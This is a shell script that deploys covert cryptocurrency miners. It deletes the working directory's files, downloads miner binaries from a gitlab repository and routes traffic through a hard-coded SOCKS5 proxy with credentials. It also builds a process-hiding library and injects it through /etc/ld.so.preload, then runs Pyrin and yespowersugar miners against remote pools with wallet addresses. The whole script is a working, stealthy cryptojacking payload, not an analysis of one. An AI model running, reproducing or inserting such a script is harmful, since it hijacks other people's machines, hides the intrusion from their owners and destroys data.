rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81

chmod 777 lol1.81

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 209.97.145.189:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar  -o stratum+tcp://138.197.12.20:443 -u shuga1qk2xeu9l86rw6hwjfezfs3dpy3zcfms0svh9j96 -t4